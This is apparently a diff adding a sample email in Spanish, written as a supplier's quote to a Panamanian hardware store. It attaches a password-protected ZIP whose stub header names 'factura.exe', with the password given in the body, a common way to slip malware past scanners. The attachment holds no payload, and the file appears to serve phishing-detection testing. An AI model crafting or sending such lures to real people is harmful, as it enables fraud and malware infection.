@@ -1,0 +1,21 @@
+Authentication-Results: mx.google.com; dkim=pass header.i=@gmail.com; spf=pass smtp.mailfrom=gmail.com; dmarc=pass header.from=gmail.com
+From: Juan Proveedor <juanprov77@gmail.com>
+To: maria@ferreteria-pacifico.com.pa
+Subject: Cotizacion solicitada
+Date: Wed, 7 Oct 2026 09:00:00 -0500
+Message-ID: <29323@gmail.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="b1"
+
+--b1
+Content-Type: text/plain; charset=utf-8
+
+Adjunto la cotización. La contraseña del archivo es: 4471
+
+--b1
+Content-Type: application/zip; name="Cotizacion_2026.zip"
+Content-Disposition: attachment; filename="Cotizacion_2026.zip"
+Content-Transfer-Encoding: base64
+
+UEsDBBQAAQAIAAAAIQAAAAAAAAAAAAAAAAAMAAAAZmFjdHVyYS5leGU=
+--b1--
